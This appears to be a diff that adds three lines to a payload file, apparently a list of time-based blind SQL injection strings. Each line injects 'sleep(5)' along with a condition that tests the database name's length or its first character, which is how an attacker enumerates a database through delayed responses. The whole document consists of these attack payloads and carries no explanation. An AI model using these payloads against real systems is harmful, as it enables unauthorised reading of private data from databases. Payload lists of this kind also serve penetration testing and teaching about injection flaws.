@@ -1,0 +1,3 @@
+1' and sleep(5) and 1=1#
+1' and sleep(5) and length(database())=4#
+1' and sleep(5) and substring(database(),1,1)="d"#
